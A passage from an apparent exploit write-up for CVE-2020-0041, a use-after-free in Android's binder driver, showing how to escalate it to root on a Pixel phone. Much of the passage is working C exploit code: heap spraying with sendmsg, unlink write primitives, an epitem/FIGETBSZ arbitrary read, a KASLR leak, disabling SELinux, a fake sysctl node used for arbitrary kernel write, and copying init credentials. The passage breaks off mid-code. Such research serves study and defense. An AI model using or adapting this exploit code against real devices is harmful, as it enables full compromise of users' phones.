            } <span class="hljs-keyword">else</span> {
[<span class="hljs-number">2</span>]             <span class="hljs-built_in">BUG_ON</span>(!<span class="hljs-built_in">list_empty</span>(&amp;node-&gt;work.entry));
                <span class="hljs-built_in">spin_lock</span>(&amp;binder_dead_nodes_lock);
                <span class="hljs-comment">/*
                 * tmp_refs could have changed so
                 * check it again
                 */</span>
                <span class="hljs-keyword">if</span> (node-&gt;tmp_refs) {
                    <span class="hljs-built_in">spin_unlock</span>(&amp;binder_dead_nodes_lock);
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
                }
[<span class="hljs-number">3</span>]             <span class="hljs-built_in">hlist_del</span>(&amp;node-&gt;dead_node);
                <span class="hljs-built_in">spin_unlock</span>(&amp;binder_dead_nodes_lock);
                <span class="hljs-built_in">binder_debug</span>(BINDER_DEBUG_INTERNAL_REFS,
                         <span class="hljs-string">"dead node %d deleted\n"</span>,
                         node-&gt;debug_id);
            }
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</pre>
<p>We can setup the node data such that we reach the else branch at <em>[1]</em> and ensure that <em>node-&gt;proc</em> is NULL. In that case we first reach the <em>list_empty</em> check at <em>[2]</em>. To bypass this check we need to setup an empty list (i.e. next and prev point to the list_head itself), which is why we require to leak the node address first.</p>
<p>Once we've bypassed the check at <em>[2]</em>, we can reach the <em>hlist_del</em> at <em>[3]</em> with controlled data. The function performs the following operations:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __hlist_del(<span class="hljs-keyword">struct</span> hlist_node *n)
{
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_node</span> *next = n-&gt;next;
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_node</span> **pprev = n-&gt;pprev;

    <span class="hljs-built_in">WRITE_ONCE</span>(*pprev, next);
    <span class="hljs-keyword">if</span> (next)
        next-&gt;pprev = pprev;
}

<span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">hlist_del</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> hlist_node *n)</span>
</span>{
    __hlist_del(n);
    n-&gt;next = LIST_POISON1;
    n-&gt;pprev = LIST_POISON2;
}
</pre>
<p>This boils down to the classic unlink primitive where we can set <em>*X = Y</em> and <em>*(Y+8) = X</em>. Therefore, having two writable kernel addresses we can corrupt some of their data using this. Additionally, if we set <em>next = NULL</em> we can perform a single 8-byte NULL write by having just one kernel address.</p>
<h2>Reallocating freed nodes with arbitrary contents</h2>
<p>The steps for obtaining an unlink primitive leading to memory corrupion described above assume we can replace the freed object by a controlled object. We do not need full control of the object, but just enough to pass all the checks and trigger the <em>hlist_del</em> primitive without crashing.</p>
<p>In order to achieve that, we used a well known technique: spraying with control messages through the sendmsg syscall. The code for this system call looks as follows:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp"><span class="hljs-type">static</span> <span class="hljs-type">int</span> ___sys_sendmsg(<span class="hljs-keyword">struct</span> socket *sock, <span class="hljs-keyword">struct</span> user_msghdr __user *msg,
             <span class="hljs-keyword">struct</span> msghdr *msg_sys, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,
             <span class="hljs-keyword">struct</span> used_address *used_address,
             <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> allowed_msghdr_flags)
{
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">compat_msghdr</span> __user *msg_compat =
        (<span class="hljs-keyword">struct</span> compat_msghdr __user *)msg;
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_storage</span> address;
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">iovec</span> iovstack[UIO_FASTIOV], *iov = iovstack;
    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ctl[<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> cmsghdr) + <span class="hljs-number">20</span>]
        __attribute__ ((<span class="hljs-built_in">aligned</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">__kernel_size_t</span>))));
    <span class="hljs-comment">/* 20 is size of ipv6_pktinfo */</span>
    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *ctl_buf = ctl;
    <span class="hljs-type">int</span> ctl_len;
    <span class="hljs-type">ssize_t</span> err;

...

        <span class="hljs-keyword">if</span> (ctl_len &gt; <span class="hljs-built_in">sizeof</span>(ctl)) {
[<span class="hljs-number">1</span>]         ctl_buf = <span class="hljs-built_in">sock_kmalloc</span>(sock-&gt;sk, ctl_len, GFP_KERNEL);
            <span class="hljs-keyword">if</span> (ctl_buf == <span class="hljs-literal">NULL</span>)
                <span class="hljs-keyword">goto</span> out_freeiov;
        }
        err = -EFAULT;
        <span class="hljs-comment">/*
         * Careful! Before this, msg_sys-&gt;msg_control contains a user pointer.
         * Afterwards, it will be a kernel pointer. Thus the compiler-assisted
         * checking falls down on this.
         */</span>
[<span class="hljs-number">2</span>]     <span class="hljs-keyword">if</span> (<span class="hljs-built_in">copy_from_user</span>(ctl_buf,
                   (<span class="hljs-type">void</span> __user __force *)msg_sys-&gt;msg_control,
                   ctl_len))
            <span class="hljs-keyword">goto</span> out_freectl;
        msg_sys-&gt;msg_control = ctl_buf;
    }

...


out_freectl:
    <span class="hljs-keyword">if</span> (ctl_buf != ctl)
[<span class="hljs-number">3</span>]    <span class="hljs-built_in">sock_kfree_s</span>(sock-&gt;sk, ctl_buf, ctl_len);
out_freeiov:
    <span class="hljs-built_in">kfree</span>(iov);
    <span class="hljs-keyword">return</span> err;
}
</pre>
<p>At <em>[1]</em> a buffer is allocated on the kernel heap if the requested control message length is larger than the local <em>ctl</em> buffer. At <em>[2]</em> the control message is copied in from userland, and finally after the message is processed the allocated buffer is freed at <em>[3]</em>.</p>
<p>We use a blocking call to make the system call block once the destination socket buffer is full, therefore blocking after the thread between points <em>[2]</em> and <em>[3]</em>. In this way we can control the lifetime of the replacement object.</p>
<p>We could also make use of the approach used by Jann Horn in his <a href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html">PROCA exploit</a>: let the sendmsg call complete, and immediately reallocate the object with e.g. a signalfd file descriptor. This would have the advantage of not needing a separate thread for each allocation, but otherwise the results should be fairly similar.</p>
<p>In any case, using this type of spraying we can reallocate the freed <em>binder_node</em> with almost complete control, as we require in order to trigger the write primitives described earlier.</p>
<p>One thing to note though is that if our spray fails, we'll end up crashing the kernel because of the amount of operations and checks being performed on the freed memory. However, this use-after-free has the very nice property that as long as we do not trigger the write primitive, we can simply close the binder file descriptor and the kernel won't notice any effects.</p>
<p>Thus, before we try to trigger a write primitive, we use the leak primitive to verify that we have successfully reallocated the node. We can do this by simply having a large amount of pending transactions, and reading one each time we need to leak some data off the freed object. If the data is not what we expected, we can simply close the binder file descriptor and try again.</p>
<p>This property makes the exploit quite reliable even in the presence of relatively unreliable reallocations.</p>
<h2>Obtaining an arbitrary read primitive</h2>
<p>At this point, we use the same arbitrary read technique as described in the OffensiveCon 2020 talk. That is, we corrupt <em>file-&gt;f_inode</em> and use the <a href="https://android.googlesource.com/kernel/msm/+/refs/tags/android-10.0.0_r0.42/fs/ioctl.c#671">following code</a>&nbsp;to perform reads:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">do_vfs_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd,
         <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span>
</span>{
    <span class="hljs-type">int</span> error = <span class="hljs-number">0</span>;
    <span class="hljs-type">int</span> __user *argp = (<span class="hljs-type">int</span> __user *)arg;
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">inode</span> *inode = <span class="hljs-built_in">file_inode</span>(filp);

    <span class="hljs-keyword">switch</span> (cmd) {

...

    <span class="hljs-keyword">case</span> FIGETBSZ:
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">put_user</span>(inode-&gt;i_sb-&gt;s_blocksize, argp);

...
</pre>
<p>If you looked at our slides, back in late 2018 we used a binder mapping spray to bypass PAN and have controlled data at a controlled location. However, the bug we are exploiting here was introduced while getting rid of the long-term kernel-side binder mappings. This means we cannot use binder mapping sprays anymore, and we must find another solution.</p>
<p>The solution we came up with was pointing our <em>f_inode</em> field right into an <em>epitem</em> structure. This structure contains a completely controllable 64-bit field: the <em>event.data</em> field. We can modify this field by using <em>ep_ctl(efd, EPOLL_CTL_MOD, fd, &amp;event)</em>. Thus, if we line up the <em>data</em> field with the <em>inode-&gt;i_sb</em> field we'll be able to perform an arbitrary read.</p>
<p>The following picture shows the setup graphically:</p>
<p><img class="u-max-full-width" src="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/arbitrary_read.png" alt="" width="100%"></p>
<p>Note how we have also corrupted the&nbsp;<em>fllink.next</em> field of the&nbsp;<em>epitem</em>, which now points back into the&nbsp;<em>file-&gt;f_inode</em> field due to our write primitive. This could be a problem if this field is ever used, but because we are the only users of these&nbsp;<em>struct file</em> and&nbsp;<em>epitem</em> instances, we just need to avoid calling any API that makes use of them and we'll be fine.</p>
<p>Based on the setup depicted above, we can now construct an arbitrary read primitive as follows:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp"><span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">read32</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span> </span>{
   <span class="hljs-keyword">struct</span> <span class="hljs-title class_">epoll_event</span> evt;
   evt.events = <span class="hljs-number">0</span>;
   evt.data.u64 = addr - <span class="hljs-number">24</span>;
   <span class="hljs-type">int</span> err = <span class="hljs-built_in">epoll_ctl</span>(file-&gt;ep_fd, EPOLL_CTL_MOD, pipes[<span class="hljs-number">0</span>], &amp;evt);
   <span class="hljs-type">uint32_t</span> test = <span class="hljs-number">0xdeadbeef</span>;
   <span class="hljs-built_in">ioctl</span>(pipes[<span class="hljs-number">0</span>], FIGETBSZ, &amp;test);
   <span class="hljs-keyword">return</span> test;
}

<span class="hljs-function"><span class="hljs-type">uint64_t</span> <span class="hljs-title">read64</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span> </span>{
   <span class="hljs-type">uint32_t</span> lo = <span class="hljs-built_in">read32</span>(addr);
   <span class="hljs-type">uint32_t</span> hi = <span class="hljs-built_in">read32</span>(addr+<span class="hljs-number">4</span>);

   <span class="hljs-keyword">return</span> (((<span class="hljs-type">uint64_t</span>)hi) &lt;&lt; <span class="hljs-number">32</span>) | lo;
}
</pre>
<p>Note that we set the data field of the&nbsp;<em>epitem</em> to&nbsp;<em>addr - 24</em>, where 24 is the offset of&nbsp;<em>s_blocksize</em> within the <em>superblock</em> structure.&nbsp;Also, even though&nbsp;<em>s_blocksize</em> is in principle 64-bit long, the&nbsp;<em>ioctl</em> code only copies 32-bits back to userland so we need to read twice if we want to read 64 bit values.</p>
<p>Now that we have an arbitrary read&nbsp;and we know the address of a <em>struct file</em> from our initial leak,&nbsp;we can simply read its <em>f_op&nbsp;</em>field to retrieve a kernel .text pointer. This then leads to fully bypassing KASLR:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp">   <span class="hljs-comment">/* Step 1: leak a pipe file address */</span>

   file = <span class="hljs-built_in">node_new</span>(<span class="hljs-string">"leak_file"</span>);

   <span class="hljs-comment">/* Only works on file implementing the 'epoll' function. */</span>
   <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">node_realloc_epitem</span>(file, pipes[<span class="hljs-number">0</span>]))
      <span class="hljs-built_in">node_reset</span>(file);

   <span class="hljs-type">uint64_t</span> file_addr = file-&gt;file_addr;
   <span class="hljs-built_in">log_info</span>(<span class="hljs-string">"[+] pipe file: 0x%lx\n"</span>, file_addr);


   <span class="hljs-comment">/* Step 2: leak epitem address */</span>
   <span class="hljs-keyword">struct</span> <span class="hljs-title class_">exp_node</span> *epitem_node = <span class="hljs-built_in">node_new</span>(<span class="hljs-string">"epitem"</span>);
   <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">node_kaddr_disclose</span>(file, epitem_node))
      <span class="hljs-built_in">node_reset</span>(epitem_node);

   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*] file epitem at %lx\n"</span>, file-&gt;kaddr);

   <span class="hljs-comment">/* 
    * Alright, now we want to do a write8 to set file-&gt;f_inode.
    * Given the unlink primitive, we'll set file-&gt;f_inode = epitem + 80
    * and epitem + 88 = &amp;file-&gt;f_inode.
    * 
    * With this we can change f_inode-&gt;i_sb by modifying the epitem data, 
    * and get an arbitrary read through ioctl.
    *
    * This is corrupting the fllink, so we better don't touch anything there!
    */</span>

   <span class="hljs-keyword">struct</span> <span class="hljs-title class_">exp_node</span> *write8_inode = <span class="hljs-built_in">node_new</span>(<span class="hljs-string">"write8_inode"</span>);
   <span class="hljs-built_in">node_write8</span>(write8_inode, file-&gt;kaddr + <span class="hljs-number">120</span> - <span class="hljs-number">40</span> , file_addr + <span class="hljs-number">0x20</span>);

   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[*] Write done, should have arbitrary read now.\n"</span>);
   <span class="hljs-type">uint64_t</span> fop = <span class="hljs-built_in">read64</span>(file_addr + <span class="hljs-number">0x28</span>);
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] file operations: %lx\n"</span>, fop);

   kernel_base = fop - OFFSET_PIPE_FOP;
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] kernel base: %lx\n"</span>, kernel_base);
</pre>
<h2>Disabling SELinux and setting up an arbitrary write primitive</h2>
<p>Now that we know the kernel base address, we can use our write primitive to write a NULL qword over the <em>selinux_enforcing</em> variable and set SELinux to permissive mode. Our exploit does this before setting up an arbitrary write primitive, because the technique we came up with actually requires disabling SELinux.</p>
<p>After considering a few alternatives, we ended up settling for attacking the sysctl tables the kernel uses to handle <em>/proc/sys</em> and all the data hanging from there. There are a number of global tables describing these variables, such as <a href="https://android.googlesource.com/kernel/msm/+/refs/tags/android-10.0.0_r0.42/kernel/sysctl.c#266">kern_table</a> below:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ctl_table</span> kern_table[] = {
    {
        .procname   = <span class="hljs-string">"sched_child_runs_first"</span>,
        .data       = &amp;sysctl_sched_child_runs_first,
        .maxlen     = <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>),
        .mode       = <span class="hljs-number">0644</span>,
        .proc_handler   = proc_dointvec,
    },
<span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_PREEMPT_TRACER) || defined(CONFIG_IRQSOFF_TRACER)</span>
    {
        .procname       = <span class="hljs-string">"preemptoff_tracing_threshold_ns"</span>,
        .data           = &amp;sysctl_preemptoff_tracing_threshold_ns,
        .maxlen         = <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>),
        .mode           = <span class="hljs-number">0644</span>,
        .proc_handler   = proc_dointvec,
    },
    {
        .procname       = <span class="hljs-string">"irqsoff_tracing_threshold_ns"</span>,
        .data           = &amp;sysctl_irqsoff_tracing_threshold_ns,
        .maxlen         = <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>),
        .mode           = <span class="hljs-number">0644</span>,
        .proc_handler   = proc_dointvec,
    },

...
</pre>
<p>For example, the first variable is called "sched_child_runs_first", which means it can be accessed through <em>/proc/sys/kernel/sched_child_runs_first</em>. The file mode is 0644, so it's writable for root only (of course SELinux restrictions may apply) and it's an integer. The reading and writing is handled by the <em>proc_dointvec</em> function, which will convert the integer to and from string representation when the file is accessed. The <em>data</em> field points to where the variable is found in memory, which makes it an interesting target to obtain an arbitrary read/write primitive.</p>
<p>We initially tried to target some of these variables, but then realized that this table is actually only used during kernel initialization. This means that corrupting the contents of this table is not very useful to us. However, this table is used to create a set of in-memory structures that define the existing sysctl variables and their permissions.</p>
<p>These structures can be found by analyzing the <a href="https://android.googlesource.com/kernel/msm/+/refs/tags/android-10.0.0_r0.42/fs/proc/proc_sysctl.c#62">sysctl_table_root</a> structure, which contains an rb-tree of <em>ctl_node</em> nodes, which then point to <em>ctl_table</em> tables defining the variables themselves. Since we have a read primitive, we can parse the tree and find the left-most node within it, which has no children nodes.</p>
<p>Under normal circumstances, this tree looks as shown in the picture below (only representing left-child connections to keep the diagram somewhat readable):</p>
<p><img class="u-max-full-width" src="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/sysctl_tree.png" alt="" width="100%"></p>
<p>If you look at the alphabetic order of these nodes, you can see that all left-child nodes are sorted in descending alphabetic order. In fact, this is the balancing rule in these trees: left-children have to be lower than the current node, and right-children higher.</p>
<p>Thus, to ensure we keep the tree balanced, we add a left child to the left-most node with a name starting with "aaa" using our <em>write8&nbsp;</em> primitive. The following code finds the left-most node of the tree in <em>prev_node</em>, which will be the insertion point for our fake node:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp">   <span class="hljs-comment">/* Now we can prepare our magic sysctl node as s child of the left-most node */</span>

   <span class="hljs-type">uint64_t</span> sysctl_table_root = kernel_base + SYSCTL_TABLE_ROOT_OFFSET;
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] sysctl_table_root = %lx\n"</span>, sysctl_table_root);
   <span class="hljs-type">uint64_t</span> ctl_dir = sysctl_table_root + <span class="hljs-number">8</span>;

   <span class="hljs-type">uint64_t</span> node = <span class="hljs-built_in">read64</span>(ctl_dir + <span class="hljs-number">80</span>);
   <span class="hljs-type">uint64_t</span> prev_node;
   <span class="hljs-keyword">while</span> (node != <span class="hljs-number">0</span>) {
      prev_node = node;
      node = <span class="hljs-built_in">read64</span>(node + <span class="hljs-number">0x10</span>); 
   }
</pre>
<p>In order to insert the new node, we need to find a location within kernel memory for it. This is required because modern phones come with PAN (Privileged Access Never) enabled, which prevents the kernel from inadvertently using userland memory. Given that we have an arbitrary read primitive, we sort this out by parsing our process' page tables starting at <em>current-&gt;mm-&gt;pgd</em> and locating the address of one of our pages in the physmap. Additionally, using the physmap alias of our own userspace page is ideal because we can easily edit the nodes to change the address of the data we want to target, giving us a flexible read/write primitive.</p>
<p>We resolve the physmap alias in the following way:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp">   <span class="hljs-comment">/* Now resolve our mapping at 2MB. But first read memstart_addr so we can do phys_to_virt() */</span>

   memstart_addr = <span class="hljs-built_in">read64</span>(kernel_base + MEMSTART_ADDR_OFFSET);
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] memstart_addr: 0x%lx\n"</span>, memstart_addr);
   <span class="hljs-type">uint64_t</span> mm = <span class="hljs-built_in">read64</span>(current + MM_OFFSET);
   <span class="hljs-type">uint64_t</span> pgd = <span class="hljs-built_in">read64</span>(mm + <span class="hljs-number">0x40</span>);
   <span class="hljs-type">uint64_t</span> entry = <span class="hljs-built_in">read64</span>(pgd);

   <span class="hljs-type">uint64_t</span> next_tbl = <span class="hljs-built_in">phys_to_virt</span>(((entry &amp; <span class="hljs-number">0xffffffffffff</span>)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt; <span class="hljs-number">12</span>);
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] First level entry: %lx -&gt; next table at %lx\n"</span>, entry, next_tbl);

   <span class="hljs-comment">/* Offset 8 for 2MB boundary */</span>
   entry = <span class="hljs-built_in">read64</span>(next_tbl + <span class="hljs-number">8</span>);
   next_tbl = <span class="hljs-built_in">phys_to_virt</span>(((entry &amp; <span class="hljs-number">0xffffffffffff</span>)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt; <span class="hljs-number">12</span>);
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Second level entry: %lx -&gt; next table at %lx\n"</span>, entry, next_tbl);

   entry = <span class="hljs-built_in">read64</span>(next_tbl);
   <span class="hljs-type">uint64_t</span> kaddr = <span class="hljs-built_in">phys_to_virt</span>(((entry &amp; <span class="hljs-number">0xffffffffffff</span>)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt; <span class="hljs-number">12</span>);


   *(<span class="hljs-type">uint64_t</span> *)map = <span class="hljs-number">0xdeadbeefbadc0ded</span>;
   <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">read64</span>(kaddr) != <span class="hljs-number">0xdeadbeefbadc0ded</span>) {
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!] Something went wrong resolving the address of our mapping\n"</span>);
      <span class="hljs-keyword">goto</span> out;
   }
</pre>
<p>Note we required to read the contents of <em>memstart_addr</em> in order to be able to translate between physical addresses and the corresponding physmap address. In any case, after running this code we know that the data we find at 0x200000 in our process address space can also be found at <em>kaddr</em> in kernel land.</p>
<p>With this, we setup a new sysctl node as follows:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp">   <span class="hljs-comment">/* We found the insertion place, setup the node */</span>

   <span class="hljs-type">uint64_t</span> node_kaddr = kaddr;
   <span class="hljs-type">void</span> *node_uaddr = map;

   <span class="hljs-type">uint64_t</span> tbl_header_kaddr = kaddr + <span class="hljs-number">0x80</span>;
   <span class="hljs-type">void</span> *tbl_header_uaddr = map + <span class="hljs-number">0x80</span>;

   <span class="hljs-type">uint64_t</span> ctl_table_kaddr = kaddr + <span class="hljs-number">0x100</span>;
   ctl_table_uaddr = map + <span class="hljs-number">0x100</span>;

   <span class="hljs-type">uint64_t</span> procname_kaddr = kaddr + <span class="hljs-number">0x200</span>;
   <span class="hljs-type">void</span> * procname_uaddr = map + <span class="hljs-number">0x200</span>;

   <span class="hljs-comment">/* Setup rb_node */</span>
   *(<span class="hljs-type">uint64_t</span> *)(node_uaddr + <span class="hljs-number">0x00</span>) = prev_node;              <span class="hljs-comment">// parent = prev_node</span>
   *(<span class="hljs-type">uint64_t</span> *)(node_uaddr + <span class="hljs-number">0x08</span>) = <span class="hljs-number">0</span>;                      <span class="hljs-comment">// right = null</span>
   *(<span class="hljs-type">uint64_t</span> *)(node_uaddr + <span class="hljs-number">0x10</span>) = <span class="hljs-number">0</span>;                      <span class="hljs-comment">// left = null</span>

   *(<span class="hljs-type">uint64_t</span> *)(node_uaddr + <span class="hljs-number">0x18</span>) = tbl_header_kaddr;       <span class="hljs-comment">// my_tbl_header</span>

   *(<span class="hljs-type">uint64_t</span> *)(tbl_header_uaddr) = ctl_table_kaddr;
   *(<span class="hljs-type">uint64_t</span> *)(tbl_header_uaddr + <span class="hljs-number">0x18</span>) = <span class="hljs-number">0</span>;                <span class="hljs-comment">// unregistering</span>
   *(<span class="hljs-type">uint64_t</span> *)(tbl_header_uaddr + <span class="hljs-number">0x20</span>) = <span class="hljs-number">0</span>;                <span class="hljs-comment">// ctl_Table_arg</span>
   *(<span class="hljs-type">uint64_t</span> *)(tbl_header_uaddr + <span class="hljs-number">0x28</span>) = sysctl_table_root;      <span class="hljs-comment">// root</span>
   *(<span class="hljs-type">uint64_t</span> *)(tbl_header_uaddr + <span class="hljs-number">0x30</span>) = sysctl_table_root;      <span class="hljs-comment">// set</span>
   *(<span class="hljs-type">uint64_t</span> *)(tbl_header_uaddr + <span class="hljs-number">0x38</span>) = sysctl_table_root + <span class="hljs-number">8</span>;  <span class="hljs-comment">// parent</span>
   *(<span class="hljs-type">uint64_t</span> *)(tbl_header_uaddr + <span class="hljs-number">0x40</span>) = node_kaddr;          <span class="hljs-comment">// node</span>
   *(<span class="hljs-type">uint64_t</span> *)(tbl_header_uaddr + <span class="hljs-number">0x48</span>) = <span class="hljs-number">0</span>;                <span class="hljs-comment">// inodes.first</span>

   <span class="hljs-comment">/* Now setup ctl_table */</span>
   <span class="hljs-type">uint64_t</span> proc_douintvec = kernel_base + PROC_DOUINTVEC_OFFSET;
   *(<span class="hljs-type">uint64_t</span> *)(ctl_table_uaddr) = procname_kaddr;           <span class="hljs-comment">// procname</span>
   *(<span class="hljs-type">uint64_t</span> *)(ctl_table_uaddr + <span class="hljs-number">8</span>) = kernel_base;          <span class="hljs-comment">// data == what to read/write</span>
   *(<span class="hljs-type">uint32_t</span> *)(ctl_table_uaddr + <span class="hljs-number">16</span>) = <span class="hljs-number">0x8</span>;                 <span class="hljs-comment">// max size</span>
   *(<span class="hljs-type">uint64_t</span> *)(ctl_table_uaddr + <span class="hljs-number">0x20</span>) = proc_douintvec;       <span class="hljs-comment">// proc_handler</span>
   *(<span class="hljs-type">uint32_t</span> *)(ctl_table_uaddr + <span class="hljs-number">20</span>) = <span class="hljs-number">0666</span>;             <span class="hljs-comment">// mode = rw-rw-rw-</span>

   <span class="hljs-comment">/*
    * Compute and write the node name. We use a random name starting with aaa
    * for two reasons:
    *
    *  - Must be the first node in the tree alphabetically given where we insert it (hence aaa...)
    *
    *  - If we already run, there's a cached dentry for each name we used earlier which has dangling 
    *    pointers but is only reachable through path lookup. If we'd reuse the name, we'd crash using 
    *    this dangling pointer at open time.
    *
    * It's easier to have a unique enough name instead of figuring out how to clear the cache,
    * which would be the cleaner solution here.
    */</span>

   <span class="hljs-type">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/dev/urandom"</span>, O_RDONLY);
   <span class="hljs-type">uint32_t</span> rnd;
   <span class="hljs-built_in">read</span>(fd, &amp;rnd, <span class="hljs-built_in">sizeof</span>(rnd));

   <span class="hljs-built_in">sprintf</span>(procname_uaddr, <span class="hljs-string">"aaa_%x"</span>, rnd);
   <span class="hljs-built_in">sprintf</span>(pathname, <span class="hljs-string">"/proc/sys/%s"</span>, procname_uaddr);

   <span class="hljs-comment">/* And finally use a write8 to inject this new sysctl node */</span>
   <span class="hljs-keyword">struct</span> <span class="hljs-title class_">exp_node</span> *write8_sysctl = <span class="hljs-built_in">node_new</span>(<span class="hljs-string">"write8_sysctl"</span>);
   <span class="hljs-built_in">node_write8</span>(write8_sysctl, kaddr, prev_node + <span class="hljs-number">16</span>);
</pre>
<p>This basically creates one file at <em>/proc/sys/aaa_[random]</em>, with read/write permissions, and uses <em>proc_douintvec</em> to handle read/writes. This function will take the <em>data</em> field as the pointer to read from or write to, and allow up to <em>max_size</em> bytes to be read or written as unsigned integers.</p>
<p>With this, we can setup a write primitive as follows:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">write64</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> value)</span> </span>{
   *(<span class="hljs-type">uint64_t</span> *)(ctl_table_uaddr + <span class="hljs-number">8</span>) = addr;          <span class="hljs-comment">// data == what to read/write</span>
   *(<span class="hljs-type">uint32_t</span> *)(ctl_table_uaddr + <span class="hljs-number">16</span>) = <span class="hljs-number">0x8</span>;

   <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];
   <span class="hljs-type">int</span> fd = <span class="hljs-built_in">open</span>(pathname, O_WRONLY);
   <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) {
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!] Failed to open. Errno: %d\n"</span>, errno);
   }

   <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">"%u %u\n"</span>, (<span class="hljs-type">uint32_t</span>)value, (<span class="hljs-type">uint32_t</span>)(value &gt;&gt; <span class="hljs-number">32</span>));
   <span class="hljs-type">int</span> ret = <span class="hljs-built_in">write</span>(fd, buf, <span class="hljs-built_in">strlen</span>(buf));
   <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!] Failed to write, errno: %d\n"</span>, errno);
   <span class="hljs-built_in">close</span>(fd); 
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">write32</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span> </span>{
   *(<span class="hljs-type">uint64_t</span> *)(ctl_table_uaddr + <span class="hljs-number">8</span>) = addr;          <span class="hljs-comment">// data == what to read/write</span>
   *(<span class="hljs-type">uint32_t</span> *)(ctl_table_uaddr + <span class="hljs-number">16</span>) = <span class="hljs-number">4</span>;

   <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];
   <span class="hljs-type">int</span> fd = <span class="hljs-built_in">open</span>(pathname, O_WRONLY);
   <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">"%u\n"</span>, value);
   <span class="hljs-built_in">write</span>(fd, buf, <span class="hljs-built_in">strlen</span>(buf));
   <span class="hljs-built_in">close</span>(fd);
}
</pre>
<h2>Getting root and cleaning up</h2>
<p>Once we have read/write capabilities on a Pixel phone, obtaining root access is as simple as copying the credentials from a root task. Since we have already disabled SELinux earlier, we just need to find the init credentials, bump their reference count and copy them to our process like this:</p>
<pre class="brush: cpp; toolbar: false; hljs language-cpp">   <span class="hljs-comment">/* Set refcount to 0x100 and set our own credentials to init's */</span>
   <span class="hljs-built_in">write32</span>(init_cred, <span class="hljs-number">0x100</span>);
   <span class="hljs-built_in">write64</span>(current + REAL_CRED_OFFSET, init_cred);
   <span class="hljs-built_in">write64</span>(current + REAL_CRED_OFFSET + <span class="hljs-number">8</span>, init_cred);

   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">getuid</span>() != <span class="hljs-number">0</span>) {
